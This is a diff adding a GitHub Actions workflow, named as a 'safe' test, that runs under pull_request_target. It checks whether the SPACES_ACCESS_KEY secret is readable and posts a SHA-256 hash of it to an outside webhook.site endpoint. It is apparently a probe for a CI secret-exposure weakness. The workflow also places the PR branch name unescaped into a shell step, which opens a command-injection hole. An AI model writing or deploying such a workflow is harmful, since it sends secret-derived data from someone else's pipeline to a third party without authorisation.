@@ -1,0 +1,36 @@
+name: Safe Secrets Exposure Test
+
+on:
+  pull_request_target:
+    paths:
+      - 'docs-preview/redoc-index.html'
+
+jobs:
+  test-secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Show PR info
+        run: |
+          echo "Actor: $GITHUB_ACTOR"
+          echo "PR number: ${{ github.event.number }}"
+          echo "Branch: ${{ github.head_ref }}"
+
+      - name: Test if secrets are accessible
+        run: |
+          echo "Testing if we can access secret..."
+          if [ -n "${{ secrets.SPACES_ACCESS_KEY }}" ]; then
+            echo "✅ Secret is accessible in pull_request_target context."
+            # Send only a hash to your webhook for safe proof
+            HASH=$(echo -n "${{ secrets.SPACES_ACCESS_KEY }}" | sha256sum | cut -d ' ' -f1)
+            curl -X POST -H "Content-Type: application/json" \
+                 -d "{\"message\":\"Secret exists\",\"hash\":\"$HASH\"}" \
+                 https://webhook.site/d3dabef3-8bf1-41f6-ab7a-9f13e9ab646a
+          else
+            echo "❌ Secret is NOT accessible."
+            curl -X POST -H "Content-Type: application/json" \
+                 -d "{\"message\":\"No secret accessible\"}" \
+                 https://webhook.site/d3dabef3-8bf1-41f6-ab7a-9f13e9ab646a
+          fi
